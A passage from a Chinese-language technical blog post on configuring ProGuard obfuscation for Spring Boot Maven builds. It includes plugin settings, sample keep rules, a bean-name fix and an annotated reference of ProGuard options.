class="name">putLibraryJarsInTempDir</span>&gt;</span>true<span class="tag">&lt;/<span class="name">putLibraryJarsInTempDir</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- 其他配置 --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 就是输入Jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">injar</span>&gt;</span>$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">injar</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">outjar</span>&gt;</span>$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">outjar</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 是否混淆 默认是true --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">obfuscate</span>&gt;</span>true<span class="tag">&lt;/<span class="name">obfuscate</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 指定该模块是否是项目的一部分，是否将生成的PG文件安装部署；对于多模块可能需要，否则会出现编译失败问题 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">attach</span>&gt;</span>true<span class="tag">&lt;/<span class="name">attach</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">attachArtifactClassifier</span>&gt;</span>pg<span class="tag">&lt;/<span class="name">attachArtifactClassifier</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 对于多模块打包时，可将依赖包通过assembly方式进行打包，参考下文常见问题 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">assembly</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">inclusions</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inclusion</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.aezo.share.reporttable<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>report-table-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">inclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">inclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 配置一个文件，通常叫做proguard.conf,该文件主要是配置options选项，也就是说使用proguard.conf那么options下的所有内容都可以移到proguard.conf中 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">proguardInclude</span>&gt;</span>$&#123;project.basedir&#125;/proguard.conf<span class="tag">&lt;/<span class="name">proguardInclude</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 这是输出路径配置，但是要注意这个路径必须要包括injar标签填写的jar --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.basedir&#125;/target<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 对输入jar进行过滤，如下配置就是对META-INFO文件不处理 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inLibsFilter</span>&gt;</span>!META-INF/**<span class="tag">&lt;/<span class="name">inLibsFilter</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 在META-INFO中显示pom.xml文件，默认为false，用处不大 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">addMavenDescriptor</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addMavenDescriptor</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--这里特别重要，此处主要是配置混淆的一些细节选项，比如哪些类不需要混淆，哪些需要混淆--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">options</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 可以在此处写option标签配置，不过我上面使用了proguardInclude，故而我更喜欢在proguard.conf中配置 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>proguard.conf (放在pom根目录)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本案例源码摘要; 基于springboot的详细推荐配置参考下文[SpringBoot案例](#SpringBoot案例)</span></span><br><span class="line">-dontnote</span><br><span class="line">-dontwarn</span><br><span class="line">-verbose</span><br><span class="line">-dontshrink</span><br><span class="line">-dontoptimize</span><br><span class="line"></span><br><span class="line">-adaptresourcefilenames    **.properties,**.xml,META-INF/MANIFEST.MF,META-INF/spring.*</span><br><span class="line">-adaptresourcefilecontents **.properties,**.xml,META-INF/MANIFEST.MF,META-INF/spring.*</span><br><span class="line"></span><br><span class="line">-adaptclassstrings</span><br><span class="line"></span><br><span class="line">-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod</span><br><span class="line">-renamesourcefileattribute SourceFile</span><br><span class="line"></span><br><span class="line"><span class="comment"># -keep 保护类及类成员不被混淆</span></span><br><span class="line">-keep public class cn.aezo.smjava.proguard.Application &#123;</span><br><span class="line">    public static void main(java.lang.String[]);</span><br><span class="line">&#125;</span><br><span class="line">-keep public class **.entity.* &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>解决混淆后，Bean类名找不到的问题</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleBeanNameGenerator</span> <span class="keyword">implements</span> <span class="title">BeanNameGenerator</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">generateBeanName</span><span class="params">(BeanDefinition definition, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 生成的是类名做为bean名称</span></span><br><span class="line">            <span class="keyword">return</span> definition.getBeanClassName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SpringApplicationBuilder(Application.class)</span><br><span class="line">                <span class="comment">// .beanNameGenerator(new SimpleBeanNameGenerator())</span></span><br><span class="line">                .beanNameGenerator(<span class="keyword">new</span> AnnotationBeanNameGenerator())</span><br><span class="line">                .run(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SpringBoot推荐配置"><a href="#SpringBoot推荐配置" class="headerlink" title="SpringBoot推荐配置"></a>SpringBoot推荐配置</h3><ul><li>proguard.conf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-include ../../../proguard-common.conf</span><br><span class="line"></span><br><span class="line">-keep class</span><br><span class="line">    cn.aezo.sqbiz.core.party.extension.IUserInfoExtension,</span><br><span class="line">    cn.aezo.sqbiz.core.party.service.I*,</span><br><span class="line">    cn.aezo.sqbiz.core.party.service.impl.UserOauthServiceImpl &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>proguard-common.conf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不打印 NOTE</span></span><br><span class="line">-dontnote</span><br><span class="line"><span class="comment"># 不打印 WARN</span></span><br><span class="line"><span class="comment"># 由于第三方包没有加密，必须关闭 WARN，否则报错: Please correct the above warnings first.</span></span><br><span class="line"><span class="comment"># 如 -dontwarn com.example.**</span></span><br><span class="line">-dontwarn</span><br><span class="line"><span class="comment"># 输出生成信息</span></span><br><span class="line">-verbose</span><br><span class="line"><span class="comment"># 不压缩(如去除未调用的代码)</span></span><br><span class="line">-dontshrink</span><br><span class="line"><span class="comment"># 不优化(如基于字节码层面)</span></span><br><span class="line">-dontoptimize</span><br><span class="line"></span><br><span class="line">-adaptresourcefilenames    **.properties,**.xml,**.yml,**.json,META-INF/**</span><br><span class="line">-adaptresourcefilecontents **.properties,**.xml,**.yml,**.json,META-INF/**</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用新的类名替换反射方法调用中的所有字符串，例如调用Class.forName('className')</span></span><br><span class="line">-adaptclassstrings</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留异常、内部类、注解信息等, SourceFile,LineNumberTable 保留行号信息</span></span><br><span class="line">-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,LocalVariable*Table,*Annotation*,Synthetic,EnclosingMethod</span><br><span class="line"><span class="comment"># 隐藏类名文件信息</span></span><br><span class="line">-renamesourcefileattribute SourceFile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留参数名</span></span><br><span class="line"><span class="comment"># spring参数绑定有些是根据controller的方法参数名称绑定的</span></span><br><span class="line">-keepparameternames</span><br><span class="line"><span class="comment"># 为了支持通过Resource获取jar包中的文件; 主应用中使用@ComponentScan扫描当前模块bean即基于Resource</span></span><br><span class="line">-keepdirectories</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留包名不变(不含类名本身)</span></span><br><span class="line">-keeppackagenames</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留枚举/可序列化对象属性</span></span><br><span class="line">-keepclassmembers enum * &#123;</span><br><span class="line">    public static **[] values();</span><br><span class="line">    public static ** valueOf(java.lang.String);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 一些需要通过JSON拷贝的可实现Serializable接口从而到达不混淆属性和get/set方法(仅保留get/set方法，再复制时仍然有问题)</span></span><br><span class="line">-keep class * extends java.io.Serializable</span><br><span class="line">-keepclassmembers class * extends java.io.Serializable &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br><span class="line">-keepclassmembers public class * &#123;</span><br><span class="line">    void <span class="built_in">set</span>*(***);</span><br><span class="line">    *** get*();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留bean的类名(只要有spring注解则保留类名)</span></span><br><span class="line">-keep @org.springframework.** public class *</span><br><span class="line"><span class="comment"># bean的成员设置</span></span><br><span class="line">-keepclassmembers @org.springframework.** public class * &#123;</span><br><span class="line">    <span class="comment"># 如在构造方法上增加了自动注入相关注解；Spring也会自动往只有一个有参构造方法中注入bean</span></span><br><span class="line">    &lt;init&gt;(**);</span><br><span class="line">    <span class="comment"># 保留@Bean对应的方法名(生成bean的名称)</span></span><br><span class="line">    @org.springframework.context.annotation.Bean public &lt;methods&gt;;</span><br><span class="line">    <span class="comment"># 自动注入的属性(ByName注入)</span></span><br><span class="line">    @org.springframework.beans.factory.annotation.Autowired &lt;fields&gt;;</span><br><span class="line">    @javax.annotation.Resource &lt;fields&gt;;</span><br><span class="line">    @javax.inject.Inject &lt;fields&gt;;</span><br><span class="line">    <span class="comment"># 保留@Pointcut注解的方法，否则@Before等注解引用pointcut就会找不到</span></span><br><span class="line">    @org.aspectj.lang.annotation.Pointcut public &lt;methods&gt;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 保留配置类属性，需要保持和配置文件中的属性对应</span></span><br><span class="line">-keepclassmembers @org.springframework.boot.context.properties.ConfigurationProperties class * &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-keepclassmembers public class cn.aezo.**.SpringU &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># mapper方法名需要和xml文件映射；实体类和vo等可能会被序列化</span></span><br><span class="line">-keep class</span><br><span class="line">    cn.aezo.**.mapper.**,</span><br><span class="line">    cn.aezo.**.entity.**,</span><br><span class="line">    cn.aezo.**.vo.**,</span><br><span class="line">    cn.aezo.**.dto.** &#123;</span><br><span class="line">    *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul><li>配置文件中可以添加注释，注释以#开头，从#到该行末尾的文字都会看做注释，不支持多行注释</li><li>在配置文件中空格和换行有相同的效果，能用空格的地方都可以用换行，反之亦然</li><li>有些配置规则中需要指定文件或文件夹的路径，如果路径中包含空格，则需要将路径用单引号或双引号括起来</li><li>配置规则中除-injars，-outjars之间有先后顺序上的要求外，其他参数顺序随意</li></ul><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li>参考: <a href="https://blog.csdn.net/ccpat/article/details/52059344" target="_blank" rel="noopener">https://blog.csdn.net/ccpat/article/details/52059344</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#递归的从给定文件中读取参数</span></span><br><span class="line">-include filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定当前配置文件中所有路径参数的基本目录</span></span><br><span class="line">-basedirectory directoryname</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被处理r的jar(或者 aars, wars, ears, zips, apks, or directories)。在默认情况下任何非.class的文件会被原样复制到最终打包的jar。这里需要注意的是那些临时文件（如IDE产生的文件），尤其是当你直接用一个目录指定jar文件。class_path下的条目可以被过滤，详细请看filter，为了可读性，可以使用多条-injars命令</span></span><br><span class="line">-injars class_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定输出jar包的名字(或者 aars, wars, ears, zips, apks, or directories)。前面-injars 指定的jar包会被包含到输出jar包里。这个也可以使用过滤，详细请看filter， </span></span><br><span class="line"><span class="comment">#你必须避免让输出文件复写输入文件。为了可读性，可以使用多条-outjars ，如果没有指定-outjar,不会有任何jar包生成。</span></span><br><span class="line">-outjars class_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定要被处理的程序依赖的jar(或者 aars, wars, ears, zips, apks, or directories)，这些jar不会被包进output jar。这个指定的jar至少得包含程序中有被继承的类。那些只有被调用的库中的class文件不需要出现，虽然他们的出现会改善优化的结果（什么鬼， Library class files that are only called needn’t be present, although their presence can improve the results of the optimization step. ）。当然这些path也是可以过滤的 ，为了可读性，可以使用多条 -libraryjars options. </span></span><br><span class="line"><span class="comment">#请注意那些为运行proguard设置的class path，不会被用于寻找类文件，也就是说你必须显示的指定你的代码需要用到的jar路径。虽然这看上去有点麻烦，但是可以让你处理不同运行环境下的程序。比如你可以处理 </span></span><br><span class="line"><span class="comment">#j2se 的程序也可以处理jar包，只要你指定合适的jar路径。</span></span><br><span class="line">-libraryjars class_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#在读取依赖的库文件时，略过非public类，来加快处理速度和减少ProGuard内存消耗 。</span></span><br><span class="line">-skipnonpubliclibraryclasses</span><br><span class="line"></span><br><span class="line"><span class="comment">#在读取依赖的库文件时，不要略过那些非public类，在4.5版本中，这是默认设置</span></span><br><span class="line">-dontskipnonpubliclibraryclasses</span><br><span class="line"></span><br><span class="line"><span class="comment">#不要忽略依赖库中的非公有的类成员，包括域和方法，proguard默认会忽略</span></span><br><span class="line">-dontskipnonpubliclibraryclassmembers</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定那些需要被保留在输出jar的文件目录，在默认情况下，这些目录会被移除来减小输出文件的size。</span></span><br><span class="line">-keepdirectories [directory_filter]</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被处理的类文件的java版本，如1.0, 1.1, 1.2, 1.3, 1.4, 1.5 (or just 5), 1.6 (or just 6), 1.7 (or just 7), or 1.8 (or just 8)</span></span><br><span class="line">-target version</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被保留的类和成员</span></span><br><span class="line">-keep 选项</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被保留的类成员，如果他们的类也有被保留。比如你要保留一个序列化类中的所有成员和方法</span></span><br><span class="line">-keepclassmembers</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定保留那些含有指定类成员的类，比如你想保留所有包含main方法的类</span></span><br><span class="line">-keepclasseswithmembers</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定那些需要被保留名字的类和类成员，前提是他们在被代码压缩的时候没有被移除。举个栗子，你可能希望保留那些实现了Serializable接口的类的名字</span></span><br><span class="line">-keepnames</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定那些希望被保留的类成员的名字</span></span><br><span class="line">-keepclassmembernames</span><br><span class="line"></span><br><span class="line"><span class="comment">#保留含有指定名字的类和类成员。</span></span><br><span class="line">-keepclasseswithmembernames</span><br><span class="line"></span><br><span class="line"><span class="comment">#将匹配的类和成员全部打印到文件或者输出。这个可以用来验证自己需要保留的类有没有成功保留</span></span><br><span class="line">-printseeds</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（文件压缩选项配置）</span></span><br><span class="line"><span class="comment"># Shrinking options  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不压缩类文件。默认情况下会压缩所有的类文件，除了那些用keep声明和被这些类依赖的class</span></span><br><span class="line">-dontshrink</span><br><span class="line"></span><br><span class="line"><span class="comment">#将没有用到的code打印到文件或者后台</span></span><br><span class="line">-printusage [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment">#将那些被保留的类的原因打印出来</span></span><br><span class="line">-whyareyoukeeping class_specification</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（文件优化配置项）</span></span><br><span class="line"><span class="comment"># Optimization options</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不优化代码，默认优化</span></span><br><span class="line">-dontoptimize</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定需要被enable和disable的优化项目。</span></span><br><span class="line">-optimizations optimization_filter</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定优化的pass数目，默认是1，多个pass可以提升优化效果. 如果在一个优化pass结束后，没有发现被提升的项目，优化就结束</span></span><br><span class="line">-optimizationpasses n</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定那些没有任何副作用的方法，也就是说这些方法没有实际用处，移除也没关系，比如log方法，请谨慎使用该参数，除非你知道你在做什么</span></span><br><span class="line">-assumenosideeffects class_specification</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置该参数后，允许proguard在优化过程中扩大访问权限。这样可以提升优化效果。请不要讲此选项应用在 </span></span><br><span class="line"><span class="comment">#作为lib使用的code中，因为这可能会将那些不希望被访问的代码变的可以被访问</span></span><br><span class="line">-allowaccessmodification</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置该参数后，允许interface被merge，即使他们的实现类没有全部实现他们。这样可以通过减少class的数量来减小输出结果的size。java 二进制规范是允许这样做的 (cfr. The Java Language Specification, Third Edition, Section 13.5.3), 虽然java语言不允许这样做(cfr. The Java Language Specification, Third Edition, Section 8.1.4). 设置这个选项会在默写虚拟机上降低处理的性能，因为一些高级的JIT偏向于更少的类实现更多的接口，更坏的是，一些虚拟机可能无法处理被优化过的代码。</span></span><br><span class="line">-mergeinterfacesaggressively</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================== #（代码混淆选项配置）</span></span><br><span class="line"><span class="comment"># Obfuscation options </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不混淆代码，默认混淆</span></span><br><span class="line">-dontobfuscate</span><br><span class="line"></span><br><span class="line"><span class="comment">#将mapping 打印到文件或后台</span></span><br><span class="line">-printmapping [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用已有的mapping文件来混淆代码</span></span><br><span class="line">-applymapping filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定希望被用做指定类和类成员混淆后新名字的列表</span></span><br><span class="line">-obfuscationdictionary filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定一个文件，里面的所有名字将被用作混淆后类的名字</span></span><br><span class="line">-classobfuscationdictionary filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定一个文件，里面的所有名字将被用作混淆后包的名字</span></span><br><span class="line">-packageobfuscationdictionary filename</span><br><span class="line"></span><br><span class="line"><span class="comment">#这只这个选项后，多个方法和域会使用同一个名字，只要他们的参数和返回类型不一样。这样可以减少优化后的size</span></span><br><span 